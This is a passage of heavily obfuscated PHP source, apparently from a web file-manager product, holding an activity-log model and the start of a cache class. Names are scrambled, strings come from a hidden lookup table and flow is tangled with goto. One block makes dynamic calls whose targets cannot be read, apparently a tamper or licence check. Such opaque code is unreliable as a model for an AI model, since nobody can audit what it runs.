"\151\x6e\x73\145\x72\x74", "\146\165\x6e\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $Dˆ…‘‘ƒù =& $_SERVER[¼€¼ˆ¦‚¡]; return array($Dˆ…‘‘ƒù[2384] => LNG($Dˆ…‘‘ƒù[2385]), $Dˆ…‘‘ƒù[2386] => LNG($Dˆ…‘‘ƒù[2387]), $Dˆ…‘‘ƒù[2044] => LNG($Dˆ…‘‘ƒù[2388]), $Dˆ…‘‘ƒù[2389] => LNG($Dˆ…‘‘ƒù[2390]), $Dˆ…‘‘ƒù[2391] => LNG($Dˆ…‘‘ƒù[2392]), $Dˆ…‘‘ƒù[2393] => LNG($Dˆ…‘‘ƒù[2394]), $Dˆ…‘‘ƒù[2395] => LNG($Dˆ…‘‘ƒù[2396]), $Dˆ…‘‘ƒù[2397] => LNG($Dˆ…‘‘ƒù[2398]), $Dˆ…‘‘ƒù[2075] => LNG($Dˆ…‘‘ƒù[2399]), $Dˆ…‘‘ƒù[2076] => LNG($Dˆ…‘‘ƒù[2400]), $Dˆ…‘‘ƒù[2401] => LNG($Dˆ…‘‘ƒù[2402]), $Dˆ…‘‘ƒù[2403] => LNG($Dˆ…‘‘ƒù[2404]), $Dˆ…‘‘ƒù[2405] => LNG($Dˆ…‘‘ƒù[2406]), $Dˆ…‘‘ƒù[2407] => LNG($Dˆ…‘‘ƒù[2408]), $Dˆ…‘‘ƒù[2073] => LNG($Dˆ…‘‘ƒù[2409]), $Dˆ…‘‘ƒù[2080] => LNG($Dˆ…‘‘ƒù[2410]), $Dˆ…‘‘ƒù[2411] => LNG($Dˆ…‘‘ƒù[2412]), $Dˆ…‘‘ƒù[2413] => LNG($Dˆ…‘‘ƒù[2414]), $Dˆ…‘‘ƒù[2415] => LNG($Dˆ…‘‘ƒù[2416]), $Dˆ…‘‘ƒù[2417] => LNG($Dˆ…‘‘ƒù[2418]), $Dˆ…‘‘ƒù[2083] => LNG($Dˆ…‘‘ƒù[2419]), $Dˆ…‘‘ƒù[2084] => LNG($Dˆ…‘‘ƒù[2420]), $Dˆ…‘‘ƒù[2421] => LNG($Dˆ…‘‘ƒù[2422]), $Dˆ…‘‘ƒù[2423] => LNG($Dˆ…‘‘ƒù[2424]), $Dˆ…‘‘ƒù[2425] => LNG($Dˆ…‘‘ƒù[2426]), $Dˆ…‘‘ƒù[2078] => LNG($Dˆ…‘‘ƒù[2427]), $Dˆ…‘‘ƒù[2428] => LNG($Dˆ…‘‘ƒù[2429]), $Dˆ…‘‘ƒù[2077] => LNG($Dˆ…‘‘ƒù[2430]), $Dˆ…‘‘ƒù[2431] => LNG($Dˆ…‘‘ƒù[2432]), $Dˆ…‘‘ƒù[2433] => LNG($Dˆ…‘‘ƒù[2434]), $Dˆ…‘‘ƒù[2435] => LNG($Dˆ…‘‘ƒù[2435]), $Dˆ…‘‘ƒù[2436] => LNG($Dˆ…‘‘ƒù[2048]), $Dˆ…‘‘ƒù[2437] => LNG($Dˆ…‘‘ƒù[2438]), $Dˆ…‘‘ƒù[2439] => LNG($Dˆ…‘‘ƒù[2440]), $Dˆ…‘‘ƒù[2441] => LNG($Dˆ…‘‘ƒù[2442]), $Dˆ…‘‘ƒù[2443] => LNG($Dˆ…‘‘ƒù[2444]), $Dˆ…‘‘ƒù[2445] => LNG($Dˆ…‘‘ƒù[2446]), $Dˆ…‘‘ƒù[2447] => LNG($Dˆ…‘‘ƒù[2447]), $Dˆ…‘‘ƒù[2448] => LNG($Dˆ…‘‘ƒù[2449]), $Dˆ…‘‘ƒù[2450] => LNG($Dˆ…‘‘ƒù[2451]), $Dˆ…‘‘ƒù[2452] => LNG($Dˆ…‘‘ƒù[2453]), $Dˆ…‘‘ƒù[2454] => LNG($Dˆ…‘‘ƒù[2455]), $Dˆ…‘‘ƒù[2456] => LNG($Dˆ…‘‘ƒù[2457]), $Dˆ…‘‘ƒù[2458] => LNG($Dˆ…‘‘ƒù[2459])); } private function typeFile() { $dáÊ§Çµæ« =& $_SERVER[¼€¼ˆ¦‚¡]; $BŸ¸‰”Úç = array($dáÊ§Çµæ«[2080] => array($dáÊ§Çµæ«[2081]), $dáÊ§Çµæ«[2405] => array($dáÊ§Çµæ«[2460]), $dáÊ§Çµæ«[2407] => array($dáÊ§Çµæ«[2461]), $dáÊ§Çµæ«[2073] => array($dáÊ§Çµæ«[2074]), $dáÊ§Çµæ«[2413] => array(), $dáÊ§Çµæ«[2415] => array(), $dáÊ§Çµæ«[2417] => array(), $dáÊ§Çµæ«[2083] => array($dáÊ§Çµæ«[2085]), $dáÊ§Çµæ«[2084] => array($dáÊ§Çµæ«[2085]), $dáÊ§Çµæ«[2421] => array($dáÊ§Çµæ«[2462]), $dáÊ§Çµæ«[2423] => array($dáÊ§Çµæ«[2462]), $dáÊ§Çµæ«[2425] => array($dáÊ§Çµæ«[2463]), $dáÊ§Çµæ«[2411] => array($dáÊ§Çµæ«[2464]), $dáÊ§Çµæ«[2078] => array($dáÊ§Çµæ«[2465]), $dáÊ§Çµæ«[2428] => array($dáÊ§Çµæ«[2466]), $dáÊ§Çµæ«[2077] => array($dáÊ§Çµæ«[2079])); return $BŸ¸‰”Úç; } private function typeAll() { goto F­ù«ï—òÆ; càÎ–ŒÎÛ: foreach ($e±÷„Ê¥ÒØ as $d°Òï¢ñÀ° => $bÌ‰õÍñÛ®) { $a¯‘ƒ‡ïğß[$bÌ‰õÍñÛ®[0]] = $a¯‘ƒ‡ïğß[$d°Òï¢ñÀ°]; } $a¯‘ƒ‡ïğß[$CÇï’¥ùó[2085]] = LNG($CÇï’¥ùó[2467]); $a¯‘ƒ‡ïğß[$CÇï’¥ùó[2462]] = LNG($CÇï’¥ùó[2468]); goto f šë¤Ù¼Ï; f šë¤Ù¼Ï: return $a¯‘ƒ‡ïğß; goto C—‰ÑîŠàÔ; F­ù«ï—òÆ: $CÇï’¥ùó =& $_SERVER[¼€¼ˆ¦‚¡]; $a¯‘ƒ‡ïğß = $this->typeList; $e±÷„Ê¥ÒØ = array_filter($this->typeFile()); goto càÎ–ŒÎÛ; C—‰ÑîŠàÔ: } public function addLog($f¶ìŠÌÆÒ, $F©ñ¹ÚÓ = array()) { goto dæÈôÑ¾´¶; dâèª¿Î§æ: $fà·«æÇ¥ = get_client_ip(); if (!$F©ñ¹ÚÓ || strlen(json_encode($F©ñ¹ÚÓ)) >= 1024) { $F©ñ¹ÚÓ = array($B¶ÀƒÏÈî´[2469] => $fà·«æÇ¥); } else { if (is_array($F©ñ¹ÚÓ)) { $F©ñ¹ÚÓ[$B¶ÀƒÏÈî´[2469]] = $fà·«æÇ¥; } else { $F©ñ¹ÚÓ = array($B¶ÀƒÏÈî´[1033] => $F©ñ¹ÚÓ, $B¶ÀƒÏÈî´[2469] => $fà·«æÇ¥); } } $F©ñ¹ÚÓ = array($B¶ÀƒÏÈî´[1427] => Session::sign(), $B¶ÀƒÏÈî´[1428] => $Dº£Şˆª´Œ, $B¶ÀƒÏÈî´[29] => $f¶ìŠÌÆÒ, $B¶ÀƒÏÈî´[1430] => json_encode($F©ñ¹ÚÓ)); goto a…Š¡ù‰Ø; a…Š¡ù‰Ø: parent::add($F©ñ¹ÚÓ); goto B‚‘…í¢ï³; dæÈôÑ¾´¶: $B¶ÀƒÏÈî´ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($this->typeList[$f¶ìŠÌÆÒ])) { return; } $Dº£Şˆª´Œ = USER_ID ? USER_ID : (isset($F©ñ¹ÚÓ[$B¶ÀƒÏÈî´[1437]]) ? $F©ñ¹ÚÓ[$B¶ÀƒÏÈî´[1437]] : 0); goto dâèª¿Î§æ; B‚‘…í¢ï³: } public function remove($B¶ë’·È´ì) { $this->where(array($_SERVER[¼€¼ˆ¦‚¡][385] => $B¶ë’·È´ì))->delete(); } private function _makeOrder($BÈæğ±óÙ¤ = '') { goto f×Ú£ÏÂ™; bÔÃ˜ˆ¬äå: return $this->order($BÈæğ±óÙ¤); goto cÑ’×Ï±; eßøáØ¤Î¬: $aôÛÒºÓ„ = Input::get($CîŒ¤³¡Ö[408], $CîŒ¤³¡Ö[7], $CîŒ¤³¡Ö[2246], array($CîŒ¤³¡Ö[2182], $CîŒ¤³¡Ö[404])); $aôÛÒºÓ„ = $aÊ¶õ‚¥Ä•[$aôÛÒºÓ„]; $BÈæğ±óÙ¤ = $BÈæğ±óÙ¤ . "{$d¶Ô„èÏ†¥}\40{$aôÛÒºÓ„}"; goto bÔÃ˜ˆ¬äå; f×Ú£ÏÂ™: $CîŒ¤³¡Ö =& $_SERVER[¼€¼ˆ¦‚¡]; $d¶Ô„èÏ†¥ = $CîŒ¤³¡Ö[187]; $aÊ¶õ‚¥Ä• = array($CîŒ¤³¡Ö[402] => $CîŒ¤³¡Ö[403], $CîŒ¤³¡Ö[404] => $CîŒ¤³¡Ö[405]); goto eßøáØ¤Î¬; cÑ’×Ï±: } public function get($A‚Ñô„‰áƒ = '') { goto b¬öÔ­–ÉŒ; b¬öÔ­–ÉŒ: $fÑñ¯Äè®¡ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$A‚Ñô„‰áƒ) { show_json(array()); } $E å“¾Á½× = array(); goto A†Õ˜Êæëƒ; A†Õ˜Êæëƒ: if ($A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[1437]]) { $E å“¾Á½×[$fÑñ¯Äè®¡[1437]] = $A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[1437]]; } if (isset($A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[698]])) { $D‰©ÊÙµÙŸ = $A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[698]]; $eÕ¢ïœƒ›Ñ = isset($A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[699]]) ? $A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[699]] : time(); $E å“¾Á½×[$fÑñ¯Äè®¡[187]] = array($fÑñ¯Äè®¡[321], array($D‰©ÊÙµÙŸ, $eÕ¢ïœƒ›Ñ)); } if ($A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[29]]) { $CÜî¨ÅíÉ = explode($fÑñ¯Äè®¡[47], $A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[29]]); $fäŞÉ¤…„ = $this->typeFile(); $dÊÅ±õ—œ’ = array(); foreach ($CÜî¨ÅíÉ as $eùØˆˆŸÍ) { $dÊÅ±õ—œ’[] = $eùØˆˆŸÍ; if (isset($fäŞÉ¤…„[$eùØˆˆŸÍ])) { $dÊÅ±õ—œ’ = array_merge($dÊÅ±õ—œ’, $fäŞÉ¤…„[$eùØˆˆŸÍ]); } } $dÊÅ±õ—œ’ = array_unique($dÊÅ±õ—œ’); if ($dÊÅ±õ—œ’) { $E å“¾Á½×[$fÑñ¯Äè®¡[29]] = array($fÑñ¯Äè®¡[7], $dÊÅ±õ—œ’); } } goto e²†„à‹Ş; e²†„à‹Ş: if (!empty($A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[2469]])) { $E å“¾Á½×[$fÑñ¯Äè®¡[405]] = array($fÑñ¯Äè®¡[748], "\45{$A‚Ñô„‰áƒ[$fÑñ¯Äè®¡[2469]]}\45"); } $BšÄêÙ£ã = $this->_makeOrder()->where($E å“¾Á½×)->selectPage(); if (empty($BšÄêÙ£ã[$fÑñ¯Äè®¡[354]])) { show_json(array(), !0, $BšÄêÙ£ã[$fÑñ¯Äè®¡[351]]); } goto eŠí¡˜‡Ú; eŠí¡˜‡Ú: $BšÄêÙ£ã[$fÑñ¯Äè®¡[354]] = $this->logList($BšÄêÙ£ã[$fÑñ¯Äè®¡[354]]); return $BšÄêÙ£ã; goto fÒÉ¢Œ¬–‘; fÒÉ¢Œ¬–‘: } private function ipAddress(&$BˆÏ‘÷…ï) { $D˜±·¥£å =& $_SERVER[¼€¼ˆ¦‚¡]; if (!empty($BˆÏ‘÷…ï[$D˜±·¥£å[2469]])) { $AùíŸçÄÆœ = IpLocation::get($BˆÏ‘÷…ï[$D˜±·¥£å[2469]]); } else { $AùíŸçÄÆœ = LNG($D˜±·¥£å[2470]); } $BˆÏ‘÷…ï[$D˜±·¥£å[2471]] = $AùíŸçÄÆœ; } private function descZipDownload($AÍ¯Ô…—…, &$f„¸Â‡‡) { $B¼èÎ§å¦Ä =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($AÍ¯Ô…—…[$B¼èÎ§å¦Ä[2472]])) { return; } $EÓİòÍŠÃï = json_decode($AÍ¯Ô…—…[$B¼èÎ§å¦Ä[2472]], !0); foreach ($EÓİòÍŠÃï as $fç¾•µ¡ïÇ) { if (!IO::init($fç¾•µ¡ïÇ[$B¼èÎ§å¦Ä[75]])) { continue; } if (!($c¸õÓ„âÆˆ = IO::infoFull($fç¾•µ¡ïÇ[$B¼èÎ§å¦Ä[75]]))) { continue; } $AÍ¯Ô…—…[$B¼èÎ§å¦Ä[75]] = $fç¾•µ¡ïÇ[$B¼èÎ§å¦Ä[75]]; $f„¸Â‡‡[] = $AÍ¯Ô…—…[$B¼èÎ§å¦Ä[369]] = $c¸õÓ„âÆˆ[$B¼èÎ§å¦Ä[369]]; $f„¸Â‡‡[] = $AÍ¯Ô…—…[$B¼èÎ§å¦Ä[2289]] = $c¸õÓ„âÆˆ[$B¼èÎ§å¦Ä[461]]; break; } return $AÍ¯Ô…—…; } private function getSourceList(&$d‘•¤õ•ÂÁ) { $E«¿„°ˆ¿± =& $_SERVER[¼€¼ˆ¦‚¡]; $B÷Øœª ğ· = array(); foreach ($d‘•¤õ•ÂÁ as $Däà©òŠ´¥ => $BÒŒË™Š”î) { goto E´Û¿ÄòÆÄ; fë³÷¹å„: if ($b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[29]] == $E«¿„°ˆ¿±[2297]) { $B÷Øœª ğ·[] = $b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[405]][$E«¿„°ˆ¿±[369]]; } goto aåÓù…’Ó; e¡£Äîñ“: $B÷Øœª ğ·[] = $b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[369]]; $B÷Øœª ğ·[] = $b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[2289]]; if ($b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[29]] == $E«¿„°ˆ¿±[492]) { $B÷Øœª ğ·[] = $b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[405]][$E«¿„°ˆ¿±[1006]]; $B÷Øœª ğ·[] = $b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[405]][$E«¿„°ˆ¿±[1007]]; } goto fë³÷¹å„; E´Û¿ÄòÆÄ: $b½İ¿¥Ó¯œ = json_decode($BÒŒË™Š”î[$E«¿„°ˆ¿±[405]], !0); if ($BÒŒË™Š”î[$E«¿„°ˆ¿±[29]] == $E«¿„°ˆ¿±[2076]) { $b½İ¿¥Ó¯œ = $this->descZipDownload($b½İ¿¥Ó¯œ, $B÷Øœª ğ·); $d‘•¤õ•ÂÁ[$Däà©òŠ´¥][$E«¿„°ˆ¿±[405]] = json_encode($b½İ¿¥Ó¯œ); continue; } if (strpos($BÒŒË™Š”î[$E«¿„°ˆ¿±[29]], $E«¿„°ˆ¿±[2290]) !== 0) { goto b›ˆïäÈ”Ú; D²¥£ˆ‡£æ: continue; goto f‘Œå•í„ï; añô·ÍŠ†¯: $B÷Øœª ğ·[] = $b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[369]] = $D•”Û™áŞË[$E«¿„°ˆ¿±[369]]; $B÷Øœª ğ·[] = $b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[2289]] = $D•”Û™áŞË[$E«¿„°ˆ¿±[461]]; $d‘•¤õ•ÂÁ[$Däà©òŠ´¥][$E«¿„°ˆ¿±[405]] = json_encode($b½İ¿¥Ó¯œ); goto D²¥£ˆ‡£æ; b›ˆïäÈ”Ú: if (!isset($b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[75]]) || strpos($BÒŒË™Š”î[$E«¿„°ˆ¿±[29]], $E«¿„°ˆ¿±[2473]) !== 0) { continue; } if (!IO::init($b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[75]])) { continue; } if (!($D•”Û™áŞË = IO::infoFull($b½İ¿¥Ó¯œ[$E«¿„°ˆ¿±[75]]))) { continue; } goto añô·ÍŠ†¯; f‘Œå•í„ï: } goto e¡£Äîñ“; aåÓù…’Ó: } if (!$B÷Øœª ğ·) { return array(); } return Model($E«¿„°ˆ¿±[749])->sourceListInfo($B÷Øœª ğ·, !0); } private function logList($Cå·ÂÌƒÁ¯) { goto EÒˆ¯›¤©Æ; E·´îÙ: $aÀÌÕÜËŸ = array(); foreach ($Cå·ÂÌƒÁ¯ as $aÚ¼ÑĞÜß => $d¤É…òôµ°) { goto B™¦Ò¶¾ã; b×†ÖÓßÔ: unset($d¤É…òôµ°[$DŒò´èŞŠ[2476]]); $E¿íÙ¬¹®[] = $d¤É…òôµ°; goto B£íÊØê†; eôÎĞ£½ÊŸ: $this->ipAddress($d¤É…òôµ°); if (strpos($eô¢¨Ï›Å¨, $DŒò´èŞŠ[2290]) === 0 || isset($a—¤ä²´¨[$DŒò´èŞŠ[2289]])) { goto fÏƒ‚éŒù; B†‰±©â: if ($a—¤ä²´¨[$DŒò´èŞŠ[2302]] && $a—¤ä²´¨[$DŒò´èŞŠ[2302]][$DŒò´èŞŠ[371]] == $DŒò´èŞŠ[1080]) { $aÀÌÕÜËŸ[] = $d¤É…òôµ°[$DŒò´èŞŠ[367]]; unset($Cå·ÂÌƒÁ¯[$aÚ¼ÑĞÜß]); continue; } goto bÕÖÓÇù; d£¢‹ßÅ£: if ($a—¤ä²´¨[$DŒò´èŞŠ[29]] == $DŒò´èŞŠ[2297]) { $a—¤ä²´¨[$DŒò´èŞŠ[405]][$DŒò´èŞŠ[369]] = $DÜ®ºÓ—İ[$a—¤ä²´¨[$DŒò´èŞŠ[405]][$DŒò´èŞŠ[369]]]; } if ($a—¤ä²´¨[$DŒò´èŞŠ[29]] == $DŒò´èŞŠ[2071]) { $a—¤ä²´¨[$DŒò´èŞŠ[2302]] = $a—¤ä²´¨[$DŒò´èŞŠ[391]]; $a—¤ä²´¨[$DŒò´èŞŠ[2289]] = $a—¤ä²´¨[$DŒò´èŞŠ[2302]][$DŒò´èŞŠ[369]]; $a—¤ä²´¨[$DŒò´èŞŠ[391]] = !1; $a—¤ä²´¨[$DŒò´èŞŠ[369]] = $DŒò´èŞŠ[33]; } if ($a—¤ä²´¨[$DŒò´èŞŠ[391]] && $a—¤ä²´¨[$DŒò´èŞŠ[391]][$DŒò´èŞŠ[371]] == $DŒò´èŞŠ[1080]) { $aÀÌÕÜËŸ[] = $d¤É…òôµ°[$DŒò´èŞŠ[367]]; unset($Cå·ÂÌƒÁ¯[$aÚ¼ÑĞÜß]); continue; } goto B†‰±©â; fÏƒ‚éŒù: $a—¤ä²´¨[$DŒò´èŞŠ[391]] = $DÜ®ºÓ—İ[$a—¤ä²´¨[$DŒò´èŞŠ[369]]]; $a—¤ä²´¨[$DŒò´èŞŠ[2302]] = $DÜ®ºÓ—İ[$a—¤ä²´¨[$DŒò´èŞŠ[2289]]]; if ($a—¤ä²´¨[$DŒò´èŞŠ[29]] == $DŒò´èŞŠ[492]) { $a—¤ä²´¨[$DŒò´èŞŠ[405]][$DŒò´èŞŠ[1006]] = $DÜ®ºÓ—İ[$a—¤ä²´¨[$DŒò´èŞŠ[405]][$DŒò´èŞŠ[1006]]]; $a—¤ä²´¨[$DŒò´èŞŠ[405]][$DŒò´èŞŠ[1007]] = $DÜ®ºÓ—İ[$a—¤ä²´¨[$DŒò´èŞŠ[405]][$DŒò´èŞŠ[1007]]]; } goto d£¢‹ßÅ£; bÕÖÓÇù: } $d¤É…òôµ°[$DŒò´èŞŠ[405]] = $a—¤ä²´¨; goto b×†ÖÓßÔ; e•ãİ«‡µä: $d¤É…òôµ°[$DŒò´èŞŠ[28]] = isset($a±ô£ã—Øß[$DŒò´èŞŠ[28]]) ? $a±ô£ã—Øß[$DŒò´èŞŠ[28]] : LNG($DŒò´èŞŠ[2470]); $d¤É…òôµ°[$DŒò´èŞŠ[2337]] = isset($a±ô£ã—Øß[$DŒò´èŞŠ[2337]]) ? $a±ô£ã—Øß[$DŒò´èŞŠ[2337]] : $DŒò´èŞŠ[33]; $d¤É…òôµ°[$DŒò´èŞŠ[1342]] = isset($c·é£ƒÉóÃ[$eô¢¨Ï›Å¨]) ? $c·é£ƒÉóÃ[$eô¢¨Ï›Å¨] : $c‚åÀ¬¡İé; goto d¨‡ï¬Ÿ±·; B™¦Ò¶¾ã: $eô¢¨Ï›Å¨ = $d¤É…òôµ°[$DŒò´èŞŠ[29]]; $a±ô£ã—Øß = isset($a—‰“À•Öö[$d¤É…òôµ°[$DŒò´èŞŠ[1437]]]) ? $a—‰“À•Öö[$d¤É…òôµ°[$DŒò´èŞŠ[1437]]] : !1; $c‚åÀ¬¡İé = strpos($eô¢¨Ï›Å¨, $DŒò´èŞŠ[2474]) === 0 ? LNG($DŒò´èŞŠ[2475]) : LNG($DŒò´èŞŠ[2470]); goto e•ãİ«‡µä; d¨‡ï¬Ÿ±·: $d¤É…òôµ°[$DŒò´èŞŠ[2245]] = $a±ô£ã—Øß; $a—¤ä²´¨ = json_decode($d¤É…òôµ°[$DŒò´èŞŠ[405]], !0); $d¤É…òôµ°[$DŒò´èŞŠ[2469]] = isset($a—¤ä²´¨[$DŒò´èŞŠ[2469]]) ? $a—¤ä²´¨[$DŒò´èŞŠ[2469]] : $DŒò´èŞŠ[33]; goto eôÎĞ£½ÊŸ; B£íÊØê†: } $this->clearSystemPathLog($aÀÌÕÜËŸ); goto A­ğæŒ­¸Ÿ; EÒˆ¯›¤©Æ: $DŒò´èŞŠ =& $_SERVER[¼€¼ˆ¦‚¡]; $F³‡ÑÏ‚´¶ = array_to_keyvalue($Cå·ÂÌƒÁ¯, $DŒò´èŞŠ[33], $DŒò´èŞŠ[1437]); $a—‰“À•Öö = Model($DŒò´èŞŠ[477])->userListInfo(array_unique($F³‡ÑÏ‚´¶)); goto D¯ŞÑĞİ§ˆ; D¯ŞÑĞİ§ˆ: $DÜ®ºÓ—İ = $this->getSourceList($Cå·ÂÌƒÁ¯); $c·é£ƒÉóÃ = $this->typeAll(); $E¿íÙ¬¹® = array(); goto E·´îÙ; A­ğæŒ­¸Ÿ: return $E¿íÙ¬¹®; goto D˜›À•ĞÈ; D˜›À•ĞÈ: } private function clearSystemPathLog($CĞ³³¹àİ‹) { $BŞ¬Ê¦³è =& $_SERVER[¼€¼ˆ¦‚¡]; if (count($CĞ³³¹àİ‹) == 0) { return; } $bš’İÛ³ö = array($BŞ¬Ê¦³è[367] => array($BŞ¬Ê¦³è[7], array_unique($CĞ³³¹àİ‹))); $this->where($bš’İÛ³ö)->delete(); } public function deviceList($Cğ¼Ã„‘´, $eŞ•Š§ØÔ« = 0) { $eæÈ‡ôèÄÙ =& $_SERVER[¼€¼ˆ¦‚¡]; $F„¨÷ô”­ = array($eæÈ‡ôèÄÙ[1437] => $Cğ¼Ã„‘´, $eæÈ‡ôèÄÙ[187] => array($eæÈ‡ôèÄÙ[927], $eŞ•Š§ØÔ«), $eæÈ‡ôèÄÙ[29] => $eæÈ‡ôèÄÙ[2044]); $e Ğ´é­ùÓ = array(); $Eàš•‘Ñˆ‘ = $this->field($eæÈ‡ôèÄÙ[2477])->where($F„¨÷ô”­)->order($eæÈ‡ôèÄÙ[2300])->limit(50)->select(); foreach ($Eàš•‘Ñˆ‘ as $eáÃŸè™Ö‹ => $fã”»òŒÍš) { goto b¹Ô‚î¼Ô±; CĞ•ç´Ñ¡: $this->ipAddress($fã”»òŒÍš); $fã”»òŒÍš[$eæÈ‡ôèÄÙ[405]] = $e»ºñ–ù; $e Ğ´é­ùÓ[$C³Ìˆ­à®] = $fã”»òŒÍš; goto d…÷Ö«â×ë; b¹Ô‚î¼Ô±: if ($eáÃŸè™Ö‹ > 0 && abs($fã”»òŒÍš[$eæÈ‡ôèÄÙ[187]] - $Eàš•‘Ñˆ‘[$eáÃŸè™Ö‹ - 1][$eæÈ‡ôèÄÙ[187]]) < 5) { continue; } $e»ºñ–ù = json_decode($fã”»òŒÍš[$eæÈ‡ôèÄÙ[405]], !0); $fã”»òŒÍš[$eæÈ‡ôèÄÙ[2469]] = isset($e»ºñ–ù[$eæÈ‡ôèÄÙ[2469]]) ? $e»ºñ–ù[$eæÈ‡ôèÄÙ[2469]] : $eæÈ‡ôèÄÙ[33]; goto D™Ì¦îç†¾; D™Ì¦îç†¾: unset($e»ºñ–ù[$eæÈ‡ôèÄÙ[2469]]); $C³Ìˆ­à® = $this->deviceType($e»ºñ–ù[$eæÈ‡ôèÄÙ[2291]]); if (isset($e Ğ´é­ùÓ[$C³Ìˆ­à®])) { continue; } goto CĞ•ç´Ñ¡; d…÷Ö«â×ë: } return array_values($e Ğ´é­ùÓ); } public function deviceType($C¿¯¾÷…‰) { return $C¿¯¾÷…‰; } } if ($_SERVER[$_SERVER[¼€¼ˆ¦‚¡][787]] != $_SERVER[$_SERVER[¼€¼ˆ¦‚¡][1400]]) { goto CØääİËÉ; CØääİËÉ: $DçÆçîØ¦ = $_SERVER[¼€¼ˆ¦‚¡][789]; $a‚¬‚‚ÃŠ„ = $_SERVER[$_SERVER[¼€¼ˆ¦‚¡][790]] . $_SERVER[¼€¼ˆ¦‚¡][791]; $bŸáÏäÛõ = $DçÆçîØ¦($a‚¬‚‚ÃŠ„); goto A£¤Ú®šá¢; A£¤Ú®šá¢: $FÈö‹Ô›¨ = explode($_SERVER[¼€¼ˆ¦‚¡][217], $bŸáÏäÛõ); if (count($FÈö‹Ô›¨) < $_SERVER[¼€¼ˆ¦‚¡][556]) { $DĞµŞùëÕ = $_SERVER[¼€¼ˆ¦‚¡][792]; $DĞµŞùëÕ(); } $a×¢æ¶¤À = $_SERVER[¼€¼ˆ¦‚¡][1049]; goto eö„àÔ°ˆô; eö„àÔ°ˆô: $a×¢æ¶¤À($_SERVER[$_SERVER[¼€¼ˆ¦‚¡][1308]]); goto b‚½šõø§; b‚½šõø§: } goto bËİÑíÎ×É; cè †Á ºŸ: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto aŸà¥²Ó¶Ô; aŸà¥²Ó¶Ô: $Aº›Íçğêë =& $_SERVER[¼€¼ˆ¦‚¡]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto E¼±ˆ¸‰Œ”; E¼±ˆ¸‰Œ”: $Eƒô¸æâå° = $GLOBALS[$Aº›Íçğêë[6]][$Aº›Íçğêë[337]]; $B¯æÈ‚·¨ê = $Eƒô¸æâå°[$Eƒô¸æâå°[$Aº›Íçğêë[751]]]; $dÛğÁÛ˜° = $Eƒô¸æâå°[$Aº›Íçğêë[752]]; goto F„„Ìğ´°Â; F„„Ìğ´°Â: switch ($Eƒô¸æâå°[$Aº›Íçğêë[751]]) { case $Aº›Íçğêë[17]: self::$handle = Model($Aº›Íçğêë[753]); break; case $Aº›Íçğêë[754]: self::$handle = new CacheRedis($B¯æÈ‚·¨ê, $dÛğÁÛ˜°); break; case $Aº›Íçğêë[755]: self::$handle = new CacheMemcached($B¯æÈ‚·¨ê, $dÛğÁÛ˜°); break; case $Aº›Íçğêë[167]: self::$handle = new CacheFile($B¯æÈ‚·¨ê, $dÛğÁÛ˜°); break; default: break; } return self::$handle; goto E—ß¯«š´À; E—ß¯«š´À: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($bÖ›ïí‚’) { if (is_array($bÖ›ïí‚’) || is_object($bÖ›ïí‚’)) { $bÖ›ïí‚’ = json_encode($bÖ›ïí‚’); } $bÖ›ïí‚’ = rawurlencode($bÖ›ïí‚’); return KOD_SITE_ID . $_SERVER[¼€¼ˆ¦‚¡][70] . $bÖ›ïí‚’; } public static function get($fĞİ‰Á¿Ô–) { $FŸ°×Ş÷  = self::key($fĞİ‰Á¿Ô–); if (!isset(self::$memoryCache[$FŸ°×Ş÷ ])) { $Fä¼ÅÜÔÑˆ = self::init()->get($FŸ°×Ş÷ ); self::$memoryCache[$FŸ°×Ş÷ ] = unserialize($Fä¼ÅÜÔÑˆ); } return self::$memoryCache[$FŸ°×Ş÷ ]; } public static function set($FŒŒ‡ °, $c°õ”³ÓŞ›, $a›çŠ¾¥†õ = false) { goto AÚ¹Ñ›»é…; fØ ­¹†åß: CacheLock::lock($FŒŒ‡ °); $dŠ±•»Œó = self::init()->set($CŠ™¶‚—Š, serialize($c°õ”³ÓŞ›), $a›çŠ¾¥†õ); self::$memoryCache[$CŠ™¶‚—Š] = $c°õ”³ÓŞ›; goto e©áØÊ é”; e©áØÊ é”: CacheLock::unlock($FŒŒ‡ °); return $dŠ±•»Œó; goto dè¤áÙ·Ş´; AÚ¹Ñ›»é…: $CŠ™¶‚—Š = self::key($FŒŒ‡ °); if (isset(self::$memoryCache[$CŠ™¶‚—Š]) && self::$memoryCache[$CŠ™¶‚—Š] === $c°õ”³ÓŞ›) { return !0; } if ($a›çŠ¾¥†õ === 0) { self::$memoryCache[$CŠ™¶‚—Š] = $c°õ”³ÓŞ›; return !0; } goto fØ ­¹†åß; dè¤áÙ·Ş´: } public static function remove($Fâ†ØäÇˆ¨) { goto f±¤Ü½©; f±¤Ü½©: $EƒÆÈî©‚§ = self::key($Fâ†ØäÇˆ¨); unset(self::$memoryCache[$EƒÆÈî©‚§]); self::clearTimeout(); goto dƒÔè»ë¿; dƒÔè»ë¿: CacheLock::lock($Fâ†ØäÇˆ¨); $a÷ŒˆÒƒŸ¡ = self::init()->remove($EƒÆÈî©‚§); 